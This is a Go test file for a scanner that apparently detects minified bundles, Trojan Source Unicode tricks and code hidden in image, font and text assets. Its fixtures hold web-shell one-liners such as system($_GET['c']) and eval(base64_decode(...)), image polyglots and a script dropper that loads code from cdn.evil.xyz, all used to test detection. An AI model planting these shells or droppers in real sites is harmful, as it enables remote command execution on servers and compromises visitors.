// Copyright (c) 2026 Rhythm Shahriar <me@rhy.io>
// SPDX-License-Identifier: MIT

package analyze

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"hash/crc32"
	"strings"
	"testing"

	"github.com/RhythmShahriar/sightread/core"
)

// bundle builds a webpack-shaped production bundle of about n bytes on
// one line: a module table, the runtime, minified names.
func bundle(n int) string {
	var b strings.Builder
	b.WriteString(`(()=>{var __webpack_modules__={`)
	for i := 0; b.Len() < n; i++ {
		fmt.Fprintf(&b, `%d:(e,t,n)=>{"use strict";n.d(t,{Z:()=>r%d});var o=n(%d),a=n.n(o);function r%d(e){return e&&e.length>%d?a()(e.slice(0,%d)).map(function(t){return t.id+"-"+t.name}):[]}},`, i, i, i+1, i, i%7, i%13)
	}
	b.WriteString(`};var __webpack_module_cache__={};function __webpack_require__(e){var t=__webpack_module_cache__[e];if(void 0!==t)return t.exports;var n=__webpack_module_cache__[e]={exports:{}};return __webpack_modules__[e](n,n.exports,__webpack_require__),n.exports}})();`)
	return b.String()
}

func TestMinified(t *testing.T) {
	longLines := strings.Repeat(strings.Repeat("a=b+c;", 120)+"\n", 20) // 720-byte lines
	mostlyLong := strings.Repeat("x;\n", 200) + strings.Repeat("y=1;", 2000) + "\n"
	short := strings.Repeat("function f(a) {\n  return a + 1;\n}\n", 100)
	css := strings.Repeat(".a{color:red}", 400)
	tests := []struct {
		name, path string
		kind       core.FileKind
		src        string
		want       bool
	}{
		{"webpack bundle", "dist/app.js", core.KindJS, bundle(200 << 10), true},
		{"named .min.js", "js/jquery.min.js", core.KindMinified, short, true},
		{"long lines", "js/app.js", core.KindJS, longLines, true},
		{"most bytes on long lines", "js/app.js", core.KindJS, mostlyLong, true},
		{"source map comment", "js/app.js", core.KindJS, short + "//# sourceMappingURL=app.js.map\n", true},
		{"esbuild runtime", "js/app.js", core.KindJS, "var __esbuild_x = 1;\n" + short, true},
		{"minified CSS", "css/style.css", core.KindText, css, true},
		{"readable JS", "js/app.js", core.KindJS, short, false},
		{"readable CSS", "css/style.css", core.KindText, strings.Repeat(".a {\n  color: red;\n}\n", 50), false},
		{"long PHP line", "x.php", core.KindPHP, longLines, false},
		{"empty", "js/app.js", core.KindJS, "", false},
		{"text file", "notes.txt", core.KindText, longLines, false},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if got := minified(tc.path, tc.kind, []byte(tc.src)); got != tc.want {
				t.Errorf("minified = %v, want %v", got, tc.want)
			}
		})
	}
}

// A real bundle's shape is minified and holds no encoded blob.
func TestBundleHasNoBlob(t *testing.T) {
	src := bundle(300 << 10)
	if !minified("dist/app.js", core.KindJS, []byte(src)) {
		t.Fatal("bundle not minified")
	}
	fs := codeFeatures(langJS, "dist/app.js", []byte(src), core.CtxCode)
	if f, ok := blobOf(fs); ok {
		t.Errorf("bundle gave a blob: %v", describe([]core.Feature{f}))
	}
}

func unicodeOf(fs []core.Feature) []string {
	var out []string
	for _, f := range fs {
		if f.Kind == core.FUnicode {
			out = append(out, f.Key+":"+f.Attrs["in"])
		}
	}
	return out
}

func TestUnicode(t *testing.T) {
	const (
		rlo = "\u202e"
		lri = "\u2066"
		pdi = "\u2069"
		rle = "\u202b"
		pdf = "\u202c"
		zws = "\u200b"
		zwj = "\u200d"
		zwn = "\u200c"
		bom = "\ufeff"
		cyA = "\u0430" // Cyrillic a
		grO = "\u03bf" // Greek omicron
	)
	tests := []struct {
		name string
		l    lang
		src  string
		want []string // key:in, in order; nil for none
	}{
		{"trojan source comment", langJS, "/*" + rlo + " } " + lri + "if (isAdmin)" + pdi + " " + lri + " begin admins only */\n", []string{"bidi:comment"}},
		{"trojan source string", langJS, "if (accessLevel != \"user" + rlo + " " + lri + "// Check if admin" + pdi + " " + lri + "\") {}\n", []string{"bidi:string"}},
		{"bidi in PHP comment", langPHP, "<?php\n// " + rlo + "secret\n$a = 1;\n", []string{"bidi:comment"}},
		{"zero-width in JS name", langJS, "var is" + zws + "Admin = true;\n", []string{"zero-width:identifier"}},
		{"zero-width in Latin string", langPHP, "<?php\n$k = 'ad" + zws + "min';\n", []string{"zero-width:string"}},
		// JavaScript reads a BOM as whitespace: it sits in code, not in
		// the name after it.
		{"BOM inside code", langJS, "var a = 1;\n" + bom + "eval(x);\n", []string{"zero-width:code"}},
		{"PHP homoglyph function", langPHP, "<?php\nfunction is_" + cyA + "dmin() { return true; }\n", []string{"homoglyph:identifier"}},
		{"PHP homoglyph variable", langPHP, "<?php\n$p" + cyA + "ss = $_GET['p'];\n", []string{"homoglyph:identifier"}},
		{"JS homoglyph Greek", langJS, "const c" + grO + "nfig = require('x');\n", []string{"homoglyph:identifier"}},
		{"BOM at the start", langJS, bom + "var a = 1;\n", nil},
		{"PHP BOM at the start", langPHP, bom + "<?php\n$a = 1;\n", nil},
		{"Arabic text with embedding", langPHP, "<?php\n$s = '" + rle + "\u0645\u0631\u062d\u0628\u0627" + pdf + "';\n", nil},
		{"emoji sequence", langJS, "const fam = '\U0001F468" + zwj + "\U0001F469" + zwj + "\U0001F467';\n", nil},
		{"Persian non-joiner", langPHP, "<?php\n$t = '\u0645\u06cc" + zwn + "\u062e\u0648\u0627\u0647\u0645';\n", nil},
		{"strip a BOM", langPHP, "<?php\n$s = str_replace('" + bom + "', '', $s);\n", nil},
		{"Greek maths name", langJS, "const \u0394t = 1, \u03c0 = Math.PI;\n", nil},
		{"Cyrillic only name", langJS, "var \u043f\u0440\u0438\u0432\u0435\u0442 = 1;\n", nil},
		{"inline HTML", langPHP, "<p>a" + zws + "b " + rlo + "</p>\n<?php echo 1;\n", nil},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			fs := codeFeatures(tc.l, "x", []byte(tc.src), core.CtxCode)
			got := unicodeOf(fs)
			if strings.Join(got, ",") != strings.Join(tc.want, ",") {
				t.Errorf("unicode features = %q, want %q", got, tc.want)
			}
		})
	}
}

func TestUnicodeEvidence(t *testing.T) {
	fs := codeFeatures(langJS, "a.js", []byte("var a = 1;\n/* x\n y \u202e */\n"), core.CtxCode)
	for _, f := range fs {
		if f.Kind == core.FUnicode {
			if f.Ev.Line != 3 || f.Attrs["char"] != "U+202E" {
				t.Errorf("line %d char %q, want 3 U+202E", f.Ev.Line, f.Attrs["char"])
			}
			if strings.Contains(f.Ev.Snippet.String(), "\u202e") {
				t.Errorf("snippet holds the raw bidi control: %q", f.Ev.Snippet)
			}
			// The evidence still shows the control it reports, escaped.
			if !strings.Contains(f.Ev.Snippet.String(), `\u202e`) {
				t.Errorf("snippet %q drops the bidi control; want it as \\u202e", f.Ev.Snippet)
			}
			return
		}
	}
	t.Fatal("no FUnicode")
}

// pngFile builds a small valid PNG with extra chunk data and bytes
// after IEND.
func pngFile(text, after []byte) []byte {
	var b bytes.Buffer
	b.WriteString("\x89PNG\r\n\x1a\n")
	chunk := func(typ string, data []byte) {
		_ = binary.Write(&b, binary.BigEndian, uint32(len(data))) // #nosec G115 -- test data is small
		b.WriteString(typ)
		b.Write(data)
		_ = binary.Write(&b, binary.BigEndian, crc32.ChecksumIEEE(append([]byte(typ), data...)))
	}
	chunk("IHDR", []byte{0, 0, 0, 1, 0, 0, 0, 1, 8, 2, 0, 0, 0})
	if text != nil {
		chunk("tEXt", text)
	}
	chunk("IDAT", randomBytes(300, 7))
	chunk("IEND", nil)
	b.Write(after)
	return b.Bytes()
}

func TestCodeInAsset(t *testing.T) {
	webshell := []byte("Comment\x00<?php system($_GET['c']); ?>")
	jsDropper := "var s=document.createElement('script');s.src='https://cdn.evil.xyz/a.js';document.body.appendChild(s);"
	tests := []struct {
		name, path string
		kind       core.FileKind
		src        []byte
		lang       string // "" for none
	}{
		{"PHP in icon.png", "images/icon.png", core.KindAsset, pngFile(webshell, nil), "php"},
		{"GIF polyglot", "uploads/a.gif", core.KindAsset, []byte("GIF89a;<?php eval($_POST['x']); ?>"), "php"},
		{"PHP in an SVG", "img/logo.svg", core.KindAsset, []byte(`<?xml version="1.0"?><svg><?php echo shell_exec($_GET['x']); ?></svg>`), "php"},
		{"short echo tag", "img/a.ico", core.KindAsset, []byte("\x00\x00\x01\x00<?= $_GET['x'] ?>"), "php"},
		{"PHP in a text file", "assets/data.txt", core.KindText, []byte("<?php\n@eval(base64_decode($_REQUEST['k']));\n"), "php"},
		{"long string assigned", "assets/cache.dat", core.KindBinary, []byte("<?php $payload = '" + strings.Repeat("QUJD", 300) + "'; eval(base64_decode($payload));"), "php"},
		{"PHP in a font", "fonts/a.woff", core.KindAsset, append([]byte("wOFF\x00\x01"), []byte("<?php\nassert($_POST['a']);")...), "php"},
		{"JS as a png", "img/pixel.png", core.KindAsset, []byte(jsDropper), "js"},
		{"JS after IEND", "img/pixel.png", core.KindAsset, pngFile(nil, []byte("\n"+jsDropper)), "js"},
		{"PNG with <? bytes", "images/a.png", core.KindAsset, pngFile(append(randomBytes(64, 3), []byte("<?\x01\xfe<? \x93(\x00<?php\x00\x01")...), randomBytes(20, 4)), ""},
		{"SVG header", "img/logo.svg", core.KindAsset, []byte(`<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg"></svg>`), ""},
		{"readme sample", "readme.txt", core.KindText, []byte("== Usage ==\n<?php echo do_shortcode('[x]'); ?>\n"), ""},
		{"prose in a png", "img/a.png", core.KindAsset, []byte("Copyright (c) 2026 the authors. All rights reserved; see LICENSE."), ""},
		{"translation", "languages/x-fa_IR.po", core.KindText, []byte("msgid \"Hello\"\nmsgstr \"\u0633\u0644\u0627\u0645\u200c\u0647\u0627\"\n"), ""},
		{"template", "views/page.html", core.KindText, []byte("<?php echo esc_html($t); ?>"), ""},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			var fs []core.Feature
			if assetChecked(tc.path, tc.kind) {
				fs, _ = assetFileFeatures(tc.path, tc.src, decodeEnv{budget: newDecodeBudget(), layers: maxLayers})
			}
			got := ""
			for _, f := range fs {
				if f.Kind == core.FCodeInAsset {
					got = f.Attrs["lang"]
					if f.Key != tc.path {
						t.Errorf("key %q, want the path", f.Key)
					}
				}
			}
			if got != tc.lang {
				t.Errorf("code-in-asset lang %q, want %q\nfeatures: %q", got, tc.lang, describe(fs))
			}
		})
	}
}

// The hidden code is analysed: what it does counts as features.
func TestCodeInAssetFeatures(t *testing.T) {
	fs, _ := assetFileFeatures("images/icon.png", pngFile([]byte("x\x00<?php system($_GET['c']); ?>"), nil), decodeEnv{budget: newDecodeBudget(), layers: maxLayers})
	if !matchFeature(fs, core.FFlow, "request->exec", nil) {
		t.Errorf("no request->exec flow from the hidden PHP: %q", describe(fs))
	}
}

// Random binary data never reads as code, whatever "<?" it holds.
func TestCodeInAssetRandom(t *testing.T) {
	for seed := range uint64(300) {
		data := randomBytes(4096, seed+100)
		for i := 0; i+8 < len(data); i += 97 {
			copy(data[i:], "<?php ")
		}
		if _, _, ok := assetCode("a.png", data); ok {
			t.Fatalf("seed %d: random bytes read as code", seed)
		}
	}
}

// An include of a file that is not code is FInclude with its extension.
func TestIncludeOfAsset(t *testing.T) {
	fs := phpFeatures("<?php\ninclude __DIR__ . '/images/icon.png';\nrequire_once 'lib/a.php';\n")
	if !matchFeature(fs, core.FInclude, "*", map[string]string{"ext": ".png"}) {
		t.Errorf("no FInclude ext .png: %q", describe(fs))
	}
	if matchFeature(fs, core.FInclude, "*", map[string]string{"ext": ".php"}) {
		t.Errorf("FInclude for a PHP file: %q", describe(fs))
	}
}

func FuzzAssetCode(f *testing.F) {
	f.Add("a.png", []byte("GIF89a;<?php eval($_POST['x']); ?>"))
	f.Add("a.png", []byte("var s=document.createElement('script');document.body.appendChild(s);"))
	f.Add("a.txt", []byte("<?= $x ?>\u202e\ufeff"))
	f.Fuzz(func(t *testing.T, p string, src []byte) {
		if len(src) > 1<<16 {
			return
		}
		fs, _ := assetFileFeatures(p, src, decodeEnv{budget: newDecodeBudget(), layers: maxLayers})
		for _, f := range fs {
			if f.Kind == core.FCodeInAsset && f.Key != p {
				t.Fatalf("key %q, want %q", f.Key, p)
			}
		}
		_ = minified(p, core.KindJS, src)
		_ = codeFeatures(langJS, p, src, core.CtxCode)
	})
}
